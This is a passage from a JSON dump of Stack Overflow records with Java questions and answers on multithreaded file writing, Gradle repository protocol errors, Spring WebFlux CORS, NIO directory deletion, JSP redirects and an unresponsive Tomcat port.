0, chunkSize);\r\n    \t\t\t\ttry {\r\n    \t\t\t\t\tfile.write(chunkData);\r\n    \t\t\t\t} catch (IOException e) {\r\n    \t\t\t\t\t//exception handle\r\n    \t\t\t\t}\r\n    \t\t\t}\r\n    \t\t});\r\n    \t}\r\n    \tfile.close();\r\n    } catch (Exception e) {\r\n    \t//clean up\r\n    }","title":"Write to text file from multiple threads?","body":"<p>You are intend to write data into one file. So if you try to lock the whole file, it'd better to use a single thread to do this job. Although you spawn 20 threads, but there is only one of them is running every time you call the method, the others are just waiting for the lock.</p>\n\n<p>I recommend you use <code>RandomAccessFile</code> to write data to your file. Then each thread can write some unique data into to the file without locking the whole file.</p>\n\n<p>Some demo code as following</p>\n\n<pre><code>try {\n    final RandomAccessFile file = new RandomAccessFile(\"/path/to/your/result.txt\", \"rw\");\n    final int numberOfThread = 20;\n    final int bufferSize = 512;\n    ExecutorService pool = Executors.newFixedThreadPool(numberOfThread);\n    final AtomicInteger byteCounter = new AtomicInteger(0);\n    final byte[] yourText = \"Your data\".getBytes();\n    for (int i = 0; i &lt; yourText.length; i++) {\n        pool.submit(new Runnable() {\n            @Override\n            public void run() {\n                int start = byteCounter.getAndAdd(bufferSize);\n                int chunkSize = bufferSize;\n                if (start + bufferSize &gt; yourText.length) {\n                    chunkSize = yourText.length - start;\n                }\n                byte[] chunkData = new byte[chunkSize];\n                System.arraycopy(yourText, start, chunkData, 0, chunkSize);\n                try {\n                    file.write(chunkData);\n                } catch (IOException e) {\n                    //exception handle\n                }\n            }\n        });\n    }\n    file.close();\n} catch (Exception e) {\n    //clean up\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":775068,"reputation":64803,"user_id":823393,"accept_rate":86,"display_name":"OldCurmudgeon"},"down_vote_count":0,"up_vote_count":7,"is_accepted":false,"score":7,"last_activity_date":1333638556,"creation_date":1333638556,"answer_id":10031206,"question_id":10027020,"body_markdown":"Duplicate question ... duplicate answer. [As I said here:][1]\r\n\r\nIf you can hold your file as a `FileOutputStream` you can lock it like this:\r\n\r\n    FileOutputStream file = ...\r\n    ....\r\n    // Thread safe version.\r\n    void write(byte[] bytes) {\r\n      try {\r\n        boolean written = false;\r\n        do {\r\n          try {\r\n            // Lock it!\r\n            FileLock lock = file.getChannel().lock();\r\n            try {\r\n              // Write the bytes.\r\n              file.write(bytes);\r\n              written = true;\r\n            } finally {\r\n              // Release the lock.\r\n              lock.release();\r\n            }\r\n          } catch ( OverlappingFileLockException ofle ) {\r\n            try {\r\n              // Wait a bit\r\n              Thread.sleep(0);\r\n            } catch (InterruptedException ex) {\r\n              throw new InterruptedIOException (&quot;Interrupted waiting for a file lock.&quot;);\r\n            }\r\n          }\r\n        } while (!written);\r\n      } catch (IOException ex) {\r\n        log.warn(&quot;Failed to lock &quot; + fileName, ex);\r\n      }\r\n    }\r\n\r\n\r\n  [1]: https://stackoverflow.com/a/9976133/823393","title":"Write to text file from multiple threads?","body":"<p>Duplicate question ... duplicate answer. <a href=\"https://stackoverflow.com/a/9976133/823393\">As I said here:</a></p>\n\n<p>If you can hold your file as a <code>FileOutputStream</code> you can lock it like this:</p>\n\n<pre><code>FileOutputStream file = ...\n....\n// Thread safe version.\nvoid write(byte[] bytes) {\n  try {\n    boolean written = false;\n    do {\n      try {\n        // Lock it!\n        FileLock lock = file.getChannel().lock();\n        try {\n          // Write the bytes.\n          file.write(bytes);\n          written = true;\n        } finally {\n          // Release the lock.\n          lock.release();\n        }\n      } catch ( OverlappingFileLockException ofle ) {\n        try {\n          // Wait a bit\n          Thread.sleep(0);\n        } catch (InterruptedException ex) {\n          throw new InterruptedIOException (\"Interrupted waiting for a file lock.\");\n        }\n      }\n    } while (!written);\n  } catch (IOException ex) {\n    log.warn(\"Failed to lock \" + fileName, ex);\n  }\n}\n</code></pre>\n"}],"owner":{"account_id":1382271,"reputation":707,"user_id":1315016,"accept_rate":55,"display_name":"Marco Micheli"},"comment_count":5,"delete_vote_count":2,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":51515,"favorite_count":0,"down_vote_count":1,"up_vote_count":8,"closed_date":1382015660,"accepted_answer_id":10027087,"answer_count":3,"score":7,"last_activity_date":1640258699,"creation_date":1333622256,"question_id":10027020,"body_markdown":"i have 20 threads that write with the println() function on a file called results.txt. How can i synchronize them all?\r\n\r\nI note every time my program run i have different number of lines of text in results.txt.\r\n\r\nThank you.","title":"Write to text file from multiple threads?","body":"<p>i have 20 threads that write with the println() function on a file called results.txt. How can i synchronize them all?</p>\n\n<p>I note every time my program run i have different number of lines of text in results.txt.</p>\n\n<p>Thank you.</p>\n"},{"tags":["java","elasticsearch","gradle","elasticsearch-5","elasticsearch-plugin"],"comments":[{"owner":{"account_id":7423601,"reputation":18712,"user_id":5646962,"display_name":"Thomas Kl&#228;ger"},"score":1,"creation_date":1640259700,"post_id":70461488,"comment_id":124554910,"body_markdown":"Does this answer your question? [Allow insecure protocols, android gradle](https://stackoverflow.com/questions/68585885/allow-insecure-protocols-android-gradle)","body":"Does this answer your question? <a href=\"https://stackoverflow.com/questions/68585885/allow-insecure-protocols-android-gradle\">Allow insecure protocols, android gradle</a>"},{"owner":{"account_id":23378540,"reputation":21,"user_id":17446673,"display_name":"Dishant Sharma"},"score":0,"creation_date":1640262810,"post_id":70461488,"comment_id":124555843,"body_markdown":"No, it works for elastic search version &gt; 7. I am using 5.6.16 and gradle v4.8","body":"No, it works for elastic search version &gt; 7. I am using 5.6.16 and gradle v4.8"},{"owner":{"account_id":7423601,"reputation":18712,"user_id":5646962,"display_name":"Thomas Kl&#228;ger"},"score":1,"creation_date":1640268869,"post_id":70461488,"comment_id":124557863,"body_markdown":"The output from the build script contains a link to the Gradle 7.3.1 documentation. That means that (no matter what you think your gradle version is) you build script is being built using Gradle 7.3.1 - Gradle helpfully inserts its running version into the generated link. And: you must be running at least on Gradle 6.0 to get that message as a warning: it was introduced with Gradle 6.0 - Gradle 4.8 can never generate a message like that.","body":"The output from the build script contains a link to the Gradle 7.3.1 documentation. That means that (no matter what you think your gradle version is) you build script is being built using Gradle 7.3.1 - Gradle helpfully inserts its running version into the generated link. And: you must be running at least on Gradle 6.0 to get that message as a warning: it was introduced with Gradle 6.0 - Gradle 4.8 can never generate a message like that."},{"owner":{"account_id":23378540,"reputation":21,"user_id":17446673,"display_name":"Dishant Sharma"},"score":1,"creation_date":1640358878,"post_id":70461488,"comment_id":124577304,"body_markdown":"Yeah, you were absolutely right! I checked my gradle version in the terminal and observed that I was using gradle 7.3.1 globally. Although, I had selected gradle 4.8 inside my project in intellij idea but still, at the time of creating the build, it was using the global gradle version 7.3.1 in my system. Then, I tried building my project using the ./gradlew build and it solved my issue. Thank you so much Thomas! Have a good day!","body":"Yeah, you were absolutely right! I checked my gradle version in the terminal and observed that I was using gradle 7.3.1 globally. Although, I had selected gradle 4.8 inside my project in intellij idea but still, at the time of creating the build, it was using the global gradle version 7.3.1 in my system. Then, I tried building my project using the ./gradlew build and it solved my issue. Thank you so much Thomas! Have a good day!"},{"owner":{"account_id":19713590,"reputation":368,"user_id":14433509,"display_name":"Hamid Hussainy"},"score":1,"creation_date":1650533241,"post_id":70461488,"comment_id":127142159,"body_markdown":"Great! thanks Thomas. It&#39;s also working well for me. Good job! try to answer it.","body":"Great! thanks Thomas. It&#39;s also working well for me. Good job! try to answer it."}],"owner":{"account_id":23378540,"reputation":21,"user_id":17446673,"display_name":"Dishant Sharma"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":6740,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"answer_count":0,"score":2,"last_activity_date":1640258692,"creation_date":1640258692,"question_id":70461488,"body_markdown":"I am using gradle 4.8. I want to create an elasticsearch plugin. I am using jdk9. The elasticsearch version, I am using is 5.6.16. When I clicked on the build button inside intellij idea, It is giving me the below error:\r\n\r\n    Could not resolve all dependencies for configuration &#39;:classpath&#39;.\r\n   &gt; Using insecure protocols with repositories, without explicit opt-in, is unsupported. Switch Maven repository &#39;maven4(http://35.164.44.153/artifactory/jcenter)&#39; to redirect to a secure protocol (like HTTPS) or allow insecure protocols. See https://docs.gradle.org/7.3.1/dsl/org.gradle.api.artifacts.repositories.UrlArtifactRepository.html#org.gradle.api.artifacts.repositories.UrlArtifactRepository:allowInsecureProtocol for more details. \r\n\r\n\r\n","title":"Using insecure protocols with repositories, without explicit opt-in, is unsupported","body":"<p>I am using gradle 4.8. I want to create an elasticsearch plugin. I am using jdk9. The elasticsearch version, I am using is 5.6.16. When I clicked on the build button inside intellij idea, It is giving me the below error:</p>\n<pre><code>Could not resolve all dependencies for configuration ':classpath'.\n</code></pre>\n<blockquote>\n<p>Using insecure protocols with repositories, without explicit opt-in, is unsupported. Switch Maven repository 'maven4(<a href=\"http://35.164.44.153/artifactory/jcenter\" rel=\"nofollow noreferrer\">http://35.164.44.153/artifactory/jcenter</a>)' to redirect to a secure protocol (like HTTPS) or allow insecure protocols. See <a href=\"https://docs.gradle.org/7.3.1/dsl/org.gradle.api.artifacts.repositories.UrlArtifactRepository.html#org.gradle.api.artifacts.repositories.UrlArtifactRepository:allowInsecureProtocol\" rel=\"nofollow noreferrer\">https://docs.gradle.org/7.3.1/dsl/org.gradle.api.artifacts.repositories.UrlArtifactRepository.html#org.gradle.api.artifacts.repositories.UrlArtifactRepository:allowInsecureProtocol</a> for more details.</p>\n</blockquote>\n"},{"tags":["java","spring","spring-boot","spring-webflux","webflux"],"comments":[{"owner":{"account_id":2064278,"reputation":13129,"user_id":1840146,"accept_rate":86,"display_name":"Toerktumlare"},"score":0,"creation_date":1637657535,"post_id":70070909,"comment_id":123878444,"body_markdown":"cross origin is the one of the most answered questions on stack overflow when it comes to spring and spring security. When you asked you must have seen the 100s of questions, and stack overflow warned you from asking this question. You have posted a generic configuration of crossorigin which tells us absolutely nothing. If you want an answer you have to put some effort into your questions so that we can reproduce the behavior, the provided config does NOT reproduce the behavior.","body":"cross origin is the one of the most answered questions on stack overflow when it comes to spring and spring security. When you asked you must have seen the 100s of questions, and stack overflow warned you from asking this question. You have posted a generic configuration of crossorigin which tells us absolutely nothing. If you want an answer you have to put some effort into your questions so that we can reproduce the behavior, the provided config does NOT reproduce the behavior."},{"owner":{"account_id":2064278,"reputation":13129,"user_id":1840146,"accept_rate":86,"display_name":"Toerktumlare"},"score":0,"creation_date":1637657578,"post_id":70070909,"comment_id":123878456,"body_markdown":"Update your question with, your endpoint, what your request looks like, whats actually in your request, and the exact response with headers. All logs. Please put some effort into your question, voted to close, lack of debugging details.","body":"Update your question with, your endpoint, what your request looks like, whats actually in your request, and the exact response with headers. All logs. Please put some effort into your question, voted to close, lack of debugging details."},{"owner":{"account_id":5814053,"reputation":2527,"user_id":7759514,"accept_rate":61,"display_name":"Tobiq"},"score":0,"creation_date":1637672768,"post_id":70070909,"comment_id":123884476,"body_markdown":"@Toerktumlare no","body":"@Toerktumlare no"},{"owner":{"account_id":2064278,"reputation":13129,"user_id":1840146,"accept_rate":86,"display_name":"Toerktumlare"},"score":0,"creation_date":1637744583,"post_id":70070909,"comment_id":123905451,"body_markdown":"Good luck, close vote stands, i recommend reading this https://stackoverflow.com/help/how-to-ask","body":"Good luck, close vote stands, i recommend reading this <a href=\"https://stackoverflow.com/help/how-to-ask\">stackoverflow.com/help/how-to-ask</a>"}],"answers":[{"tags":[],"owner":{"account_id":3101358,"reputation":962,"user_id":2625393,"display_name":"Numichi"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640258634,"creation_date":1640258634,"answer_id":70461470,"question_id":70070909,"body_markdown":"I have just the Kotlin project, but the similar syntax in Java. Basically, class, annotation and method calling same.\r\n\r\nI use this for Stateless API interface.\r\n\r\n```kotlin\r\n@EnableWebFluxSecurity\r\nclass SecurityConfiguration {\r\n\r\n    @Bean\r\n    fun securityWebFilterChain(http: ServerHttpSecurity): SecurityWebFilterChain {\r\n        return http.securityContextRepository(NoOpServerSecurityContextRepository.getInstance())\r\n            .csrf().disable()\r\n            .cors().disable()\r\n            .logout().disable()\r\n            .formLogin().disable()\r\n            .headers { it.cache().disable() }\r\n            .build()\r\n    }\r\n}\r\n```","title":"enabling CrossOrigin access with spring webflux application","body":"<p>I have just the Kotlin project, but the similar syntax in Java. Basically, class, annotation and method calling same.</p>\n<p>I use this for Stateless API interface.</p>\n<pre class=\"lang-kotlin prettyprint-override\"><code>@EnableWebFluxSecurity\nclass SecurityConfiguration {\n\n    @Bean\n    fun securityWebFilterChain(http: ServerHttpSecurity): SecurityWebFilterChain {\n        return http.securityContextRepository(NoOpServerSecurityContextRepository.getInstance())\n            .csrf().disable()\n            .cors().disable()\n            .logout().disable()\n            .formLogin().disable()\n            .headers { it.cache().disable() }\n            .build()\n    }\n}\n</code></pre>\n"}],"owner":{"account_id":5814053,"reputation":2527,"user_id":7759514,"accept_rate":61,"display_name":"Tobiq"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":92,"favorite_count":0,"down_vote_count":1,"up_vote_count":0,"answer_count":1,"score":-1,"last_activity_date":1640258634,"creation_date":1637606863,"question_id":70070909,"body_markdown":"I recently switched my app over from webmvc to webflux, and tried to configure this \r\n\r\n```java\r\n@Configuration\r\n@EnableWebFlux\r\npublic class WebConfig implements WebFluxConfigurer {\r\n\r\n    @Override\r\n    public void addCorsMappings(CorsRegistry registry) {\r\n        registry.addMapping(&quot;/**&quot;)\r\n                .allowedOrigins(&quot;*&quot;);\r\n    }\r\n\r\n    @Bean\r\n    CorsWebFilter corsWebFilter() {\r\n        var corsConfig = new CorsConfiguration();\r\n        corsConfig.setAllowedOrigins(List.of(&quot;*&quot;));\r\n\r\n        var source = new UrlBasedCorsConfigurationSource();\r\n        source.registerCorsConfiguration(&quot;/**&quot;, corsConfig);\r\n\r\n        return new CorsWebFilter(source);\r\n    }\r\n}\r\n```\r\nand also tried adding `@CrossOrigin` to my controller.\r\n\r\nBut I&#39;m still not getting the cross-origin response headers.\r\n\r\nAnyone know the fix?","title":"enabling CrossOrigin access with spring webflux application","body":"<p>I recently switched my app over from webmvc to webflux, and tried to configure this</p>\n<pre class=\"lang-java prettyprint-override\"><code>@Configuration\n@EnableWebFlux\npublic class WebConfig implements WebFluxConfigurer {\n\n    @Override\n    public void addCorsMappings(CorsRegistry registry) {\n        registry.addMapping(&quot;/**&quot;)\n                .allowedOrigins(&quot;*&quot;);\n    }\n\n    @Bean\n    CorsWebFilter corsWebFilter() {\n        var corsConfig = new CorsConfiguration();\n        corsConfig.setAllowedOrigins(List.of(&quot;*&quot;));\n\n        var source = new UrlBasedCorsConfigurationSource();\n        source.registerCorsConfiguration(&quot;/**&quot;, corsConfig);\n\n        return new CorsWebFilter(source);\n    }\n}\n</code></pre>\n<p>and also tried adding <code>@CrossOrigin</code> to my controller.</p>\n<p>But I'm still not getting the cross-origin response headers.</p>\n<p>Anyone know the fix?</p>\n"},{"tags":["java"],"answers":[{"tags":[],"owner":{"account_id":1257553,"reputation":1302,"user_id":1216702,"accept_rate":100,"display_name":"Teg"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1640258560,"creation_date":1640254742,"answer_id":70460689,"question_id":70460620,"body_markdown":"1) To create folders and a file you can use this:\r\n```\r\n        Path myRoot = Paths.get(&quot;files&quot;);\r\n        Path pathDir = myRoot\r\n                .resolve(&quot;firstDir&quot;)\r\n                .resolve(&quot;secondDir&quot;);\r\n        final boolean created = Files.createDirectories(pathDir)\r\n                .resolve(&quot;file.txt&quot;)\r\n                .toFile()\r\n                .createNewFile();\r\n```\r\n\r\n2) To delete a folder recursively you must start walking from the folder itself\r\n```java\r\n         Files.walk(Paths.get(&quot;files&quot;))\r\n            .sorted(Comparator.reverseOrder())\r\n            .map(Path::toFile)\r\n            .forEach(File::delete);  \r\n```","title":"NIO delete dirs and file","body":"<ol>\n<li>To create folders and a file you can use this:</li>\n</ol>\n<pre><code>        Path myRoot = Paths.get(&quot;files&quot;);\n        Path pathDir = myRoot\n                .resolve(&quot;firstDir&quot;)\n                .resolve(&quot;secondDir&quot;);\n        final boolean created = Files.createDirectories(pathDir)\n                .resolve(&quot;file.txt&quot;)\n                .toFile()\n                .createNewFile();\n</code></pre>\n<ol start=\"2\">\n<li>To delete a folder recursively you must start walking from the folder itself</li>\n</ol>\n<pre class=\"lang-java prettyprint-override\"><code>         Files.walk(Paths.get(&quot;files&quot;))\n            .sorted(Comparator.reverseOrder())\n            .map(Path::toFile)\n            .forEach(File::delete);  \n</code></pre>\n"},{"tags":[],"owner":{"account_id":10481421,"reputation":1559,"user_id":7726319,"accept_rate":0,"display_name":"Prog_G"},"down_vote_count":1,"up_vote_count":2,"is_accepted":true,"score":1,"last_activity_date":1640255818,"creation_date":1640255818,"answer_id":70460914,"question_id":70460620,"body_markdown":"To delete directory and file from the root path use the following method:\r\n\r\n    public static void deleteFilesAndDir(Path pathDir) throws IOException {\r\n            Files.walk(pathDir)\r\n                    .sorted(Comparator.reverseOrder())\r\n                    .forEach(fileToDelete -&gt; {\r\n                        if (!Files.isDirectory(fileToDelete)) {\r\n                            try {\r\n                                Files.delete(fileToDelete);\r\n                            } catch (Exception e) {\r\n                                e.printStackTrace();\r\n                            }\r\n                            if (fileToDelete.toFile().getParentFile().length() == 0) {\r\n                                try {\r\n                                    FileUtils.deleteDirectory(new File(fileToDelete.toFile().getParent()));\r\n                                } catch (Exception e) {\r\n                                    e.printStackTrace();\r\n                                }\r\n                            }\r\n                        }\r\n                    });\r\n        }\r\n    \r\n        public static boolean deleteDirectory(File directoryToBeDeleted) {\r\n            File[] allContents = directoryToBeDeleted.listFiles();\r\n            if (allContents != null) {\r\n                for (File file : allContents) {\r\n                    deleteDirectory(file);\r\n                }\r\n            }\r\n            return directoryToBeDeleted.delete();\r\n        }\r\n\r\nCall the above method like below:\r\n\r\n    deleteDirectory(Path.of(&quot;files&quot;))","title":"NIO delete dirs and file","body":"<p>To delete directory and file from the root path use the following method:</p>\n<pre><code>public static void deleteFilesAndDir(Path pathDir) throws IOException {\n        Files.walk(pathDir)\n                .sorted(Comparator.reverseOrder())\n                .forEach(fileToDelete -&gt; {\n                    if (!Files.isDirectory(fileToDelete)) {\n                        try {\n                            Files.delete(fileToDelete);\n                        } catch (Exception e) {\n                            e.printStackTrace();\n                        }\n                        if (fileToDelete.toFile().getParentFile().length() == 0) {\n                            try {\n                                FileUtils.deleteDirectory(new File(fileToDelete.toFile().getParent()));\n                            } catch (Exception e) {\n                                e.printStackTrace();\n                            }\n                        }\n                    }\n                });\n    }\n\n    public static boolean deleteDirectory(File directoryToBeDeleted) {\n        File[] allContents = directoryToBeDeleted.listFiles();\n        if (allContents != null) {\n            for (File file : allContents) {\n                deleteDirectory(file);\n            }\n        }\n        return directoryToBeDeleted.delete();\n    }\n</code></pre>\n<p>Call the above method like below:</p>\n<pre><code>deleteDirectory(Path.of(&quot;files&quot;))\n</code></pre>\n"}],"owner":{"account_id":20853579,"reputation":338,"user_id":16436722,"display_name":""},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":169,"favorite_count":0,"down_vote_count":1,"up_vote_count":1,"accepted_answer_id":70460914,"answer_count":2,"score":0,"last_activity_date":1640258560,"creation_date":1640254409,"question_id":70460620,"body_markdown":"trying NIO and got two problems.1)\r\n create dir files and two inner dirs with file in last dir.\r\n\r\n    Path pathDir = Path.of(&quot;files&quot;, &quot;firstDir&quot;, &quot;secondDir&quot;);\r\n    Path pathFile = Path.of(&quot;files&quot;, &quot;firstDir&quot;, &quot;secondDir&quot;, &quot;file.txt&quot;);\r\n        \r\n    Files.createDirectories(pathDir);\r\n    Files.createFile(pathFile);\r\n\r\nis there any way to combine this into one expression so as not to create folders and files separately?    \r\n2) deleting file with dirs\r\n\r\n    Files.deleteIfExists(pathFile); //delete only file\r\n    Files.deleteIfExists(pathDir); // delete only last dir secondDir  \r\n\r\ndeletes one item at a time, how to delete all folders and a file at once?\r\n\r\nI found such an example, but it also deletes only the file\r\n\r\n     Files.walk(pathFile)\r\n                .sorted(Comparator.reverseOrder())\r\n                .map(Path::toFile)\r\n                .forEach(File::delete);  \r\nand this option deletes only one file\r\n\r\n    try {\r\n        Files.walkFileTree(pathFile, new SimpleFileVisitor&lt;Path&gt;() {\r\n            @Override\r\n            public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {\r\n                System.out.println(&quot;delete file: &quot; + file.toString());\r\n                Files.delete(file);\r\n                return FileVisitResult.CONTINUE;\r\n            }\r\n\r\n            @Override\r\n            public FileVisitResult postVisitDirectory(Path dir, IOException exc) throws IOException {\r\n                Files.delete(dir);\r\n                System.out.println(&quot;delete dir: &quot; + dir.toString());\r\n                return FileVisitResult.CONTINUE;\r\n            }\r\n        });\r\n    } catch (IOException e) {\r\n        e.printStackTrace();\r\n    }\r\n\r\n\r\n\r\n\r\n\r\n","title":"NIO delete dirs and file","body":"<p>trying NIO and got two problems.1)\ncreate dir files and two inner dirs with file in last dir.</p>\n<pre><code>Path pathDir = Path.of(&quot;files&quot;, &quot;firstDir&quot;, &quot;secondDir&quot;);\nPath pathFile = Path.of(&quot;files&quot;, &quot;firstDir&quot;, &quot;secondDir&quot;, &quot;file.txt&quot;);\n    \nFiles.createDirectories(pathDir);\nFiles.createFile(pathFile);\n</code></pre>\n<p>is there any way to combine this into one expression so as not to create folders and files separately?<br />\n2) deleting file with dirs</p>\n<pre><code>Files.deleteIfExists(pathFile); //delete only file\nFiles.deleteIfExists(pathDir); // delete only last dir secondDir  \n</code></pre>\n<p>deletes one item at a time, how to delete all folders and a file at once?</p>\n<p>I found such an example, but it also deletes only the file</p>\n<pre><code> Files.walk(pathFile)\n            .sorted(Comparator.reverseOrder())\n            .map(Path::toFile)\n            .forEach(File::delete);  \n</code></pre>\n<p>and this option deletes only one file</p>\n<pre><code>try {\n    Files.walkFileTree(pathFile, new SimpleFileVisitor&lt;Path&gt;() {\n        @Override\n        public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {\n            System.out.println(&quot;delete file: &quot; + file.toString());\n            Files.delete(file);\n            return FileVisitResult.CONTINUE;\n        }\n\n        @Override\n        public FileVisitResult postVisitDirectory(Path dir, IOException exc) throws IOException {\n            Files.delete(dir);\n            System.out.println(&quot;delete dir: &quot; + dir.toString());\n            return FileVisitResult.CONTINUE;\n        }\n    });\n} catch (IOException e) {\n    e.printStackTrace();\n}\n</code></pre>\n"},{"tags":["java","spring","spring-mvc","jsp"],"comments":[{"owner":{"account_id":19052506,"reputation":1223,"user_id":13910368,"display_name":"M123"},"score":0,"creation_date":1640258845,"post_id":70461417,"comment_id":124554676,"body_markdown":"You can use ModelAndView to redirect in jsp page","body":"You can use ModelAndView to redirect in jsp page"},{"owner":{"account_id":19263501,"reputation":55,"user_id":14078880,"display_name":"Josepch"},"score":0,"creation_date":1640259560,"post_id":70461417,"comment_id":124554878,"body_markdown":"Thank you, I will try that.","body":"Thank you, I will try that."}],"owner":{"account_id":19263501,"reputation":55,"user_id":14078880,"display_name":"Josepch"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":93,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1640258348,"creation_date":1640258348,"question_id":70461417,"body_markdown":"I did some searching prior to this and cannot find anything that fits my question. I have a Sprint Boot app with an initial page that every time a user goes to the index.jsp adds a number to a counter of visitors. They can go to the counter jsp will display the current count and a &quot;Test Another Visit&quot; link. There is another counter2.jsp page that if a user visits, it gives the current count plus one additional visit added to it. A &quot;reset&quot; link on each page should reset the counter to 0 and return the user to /counter or /counter two based on the page they clicked the reset button.\r\n\r\nI have the following Rest Controller Method:\r\n```\r\n@RequestMapping(&quot;/reset&quot;)\r\n\tpublic String reset(HttpServletRequest request, HttpSession session) {\r\n\t\tString redirectUrl = &quot;&quot;;\r\n\t\tif(request.getRequestURL().toString().contains(&quot;/counter&quot;)) {\r\n\t\t\tsession.setAttribute(&quot;current&quot;, 0);\r\n\t\t\tredirectUrl = &quot;redirect:/counter&quot;;\r\n\t\t} else if (request.getRequestURL().toString().contains(&quot;/counter2&quot;)) {\r\n\t\t\tsession.setAttribute(&quot;current&quot;, 0);\r\n\t\t\tredirectUrl = &quot;redirect:/counter2&quot;;\r\n\t\t}\r\n\t\treturn redirectUrl;\r\n\t}\r\n\r\n```\r\nWhich gives me this error:\r\n[![Image of the error][1]][1]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/p8oPl.png\r\n\r\nCan anyone please tell me what I am doing wrong and how to fix it? I am new to Spring.\r\n\r\nThank you,\r\n\r\nI apologize in advance if I somehow &#39;asked&quot; my question wrong, I know some people seem to get upset about that.\r\n\r\nAlso, this is not for an assignment, just personal practice.\r\n","title":"How can I redirect to a jsp page from my controller?","body":"<p>I did some searching prior to this and cannot find anything that fits my question. I have a Sprint Boot app with an initial page that every time a user goes to the index.jsp adds a number to a counter of visitors. They can go to the counter jsp will display the current count and a &quot;Test Another Visit&quot; link. There is another counter2.jsp page that if a user visits, it gives the current count plus one additional visit added to it. A &quot;reset&quot; link on each page should reset the counter to 0 and return the user to /counter or /counter two based on the page they clicked the reset button.</p>\n<p>I have the following Rest Controller Method:</p>\n<pre><code>@RequestMapping(&quot;/reset&quot;)\n    public String reset(HttpServletRequest request, HttpSession session) {\n        String redirectUrl = &quot;&quot;;\n        if(request.getRequestURL().toString().contains(&quot;/counter&quot;)) {\n            session.setAttribute(&quot;current&quot;, 0);\n            redirectUrl = &quot;redirect:/counter&quot;;\n        } else if (request.getRequestURL().toString().contains(&quot;/counter2&quot;)) {\n            session.setAttribute(&quot;current&quot;, 0);\n            redirectUrl = &quot;redirect:/counter2&quot;;\n        }\n        return redirectUrl;\n    }\n\n</code></pre>\n<p>Which gives me this error:\n<a href=\"https://i.stack.imgur.com/p8oPl.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/p8oPl.png\" alt=\"Image of the error\" /></a></p>\n<p>Can anyone please tell me what I am doing wrong and how to fix it? I am new to Spring.</p>\n<p>Thank you,</p>\n<p>I apologize in advance if I somehow 'asked&quot; my question wrong, I know some people seem to get upset about that.</p>\n<p>Also, this is not for an assignment, just personal practice.</p>\n"},{"tags":["java","linux","tomcat","port"],"comments":[{"owner":{"account_id":1101161,"reputation":119804,"user_id":1093528,"accept_rate":65,"display_name":"fge"},"score":0,"creation_date":1324241227,"post_id":8554663,"comment_id":10601681,"body_markdown":"Does telnet from the local machine itself work?","body":"Does telnet from the local machine itself work?"},{"owner":{"account_id":1101161,"reputation":119804,"user_id":1093528,"accept_rate":65,"display_name":"fge"},"score":0,"creation_date":1324241394,"post_id":8554663,"comment_id":10601714,"body_markdown":"Then it is likely that your hosting provider doesn&#39;t allow to listen on ports greater than 1024...","body":"Then it is likely that your hosting provider doesn&#39;t allow to listen on ports greater than 1024..."},{"owner":{"account_id":4191369,"reputation":3423,"user_id":3433918,"accept_rate":95,"display_name":"pawel7318"},"score":0,"creation_date":1453994582,"post_id":8554663,"comment_id":57853743,"body_markdown":"It runs fine for the very first time. Than after restart it hungs (port is listening and I can connect). Logs, blind config changes, strace, restarts - nothing helped. Than I took a break. When I came back I realized it&#39;s working ! I checked and it takes about 8 minutes to start [:oink:]","body":"It runs fine for the very first time. Than after restart it hungs (port is listening and I can connect). Logs, blind config changes, strace, restarts - nothing helped. Than I took a break. When I came back I realized it&#39;s working ! I checked and it takes about 8 minutes to start [:oink:]"}],"answers":[{"tags":[],"owner":{"account_id":26247,"reputation":33763,"user_id":68105,"accept_rate":69,"display_name":"MK."},"down_vote_count":0,"up_vote_count":23,"is_accepted":true,"score":23,"last_activity_date":1444725922,"creation_date":1324241346,"answer_id":8554703,"question_id":8554663,"body_markdown":"First step is to run telnet localhost 8080 when logged in locally.  Then type in something like\r\n\r\n    GET /\r\n\r\nand you should get HTML back.\r\nIf that doesn&#39;t work, then tomcat is not really running properly or is not listening on port 8080.\r\nIf that works but when trying from outside, make sure that you have the correct ip address.  Try with ip address first.  If ip address works, perhaps your mydomain.com doesn&#39;t resolve to it.\r\nIf ip is correct (the same one you are ssh&#39;ing to) and it still doesn&#39; work, then you are probably running firewall which doesn&#39;t allow 8080 through.  Changing firewall configuration requires root access.\r\n","title":"Tomcat is running but 8080 port is not responding","body":"<p>First step is to run telnet localhost 8080 when logged in locally.  Then type in something like</p>\n\n<pre><code>GET /\n</code></pre>\n\n<p>and you should get HTML back.\nIf that doesn't work, then tomcat is not really running properly or is not listening on port 8080.\nIf that works but when trying from outside, make sure that you have the correct ip address.  Try with ip address first.  If ip address works, perhaps your mydomain.com doesn't resolve to it.\nIf ip is correct (the same one you are ssh'ing to) and it still doesn' work, then you are probably running firewall which doesn't allow 8080 through.  Changing firewall configuration requires root access.</p>\n"},{"tags":[],"owner":{"account_id":1186892,"reputation":150,"user_id":1160675,"display_name":"Samir Kumar"},"down_vote_count":6,"up_vote_count":4,"is_accepted":false,"score":-2,"last_activity_date":1379671391,"creation_date":1379671391,"answer_id":18914024,"question_id":8554663,"body_markdown":"Close the IDE. Restart the process java.exe if you are on a windows system. And fire up the IDE after that.","title":"Tomcat is running but 8080 port is not responding","body":"<p>Close the IDE. Restart the process java.exe if you are on a windows system. And fire up the IDE after that.</p>\n"},{"tags":[],"owner":{"account_id":1479008,"reputation":2087,"user_id":2627025,"accept_rate":80,"display_name":"Chaminda 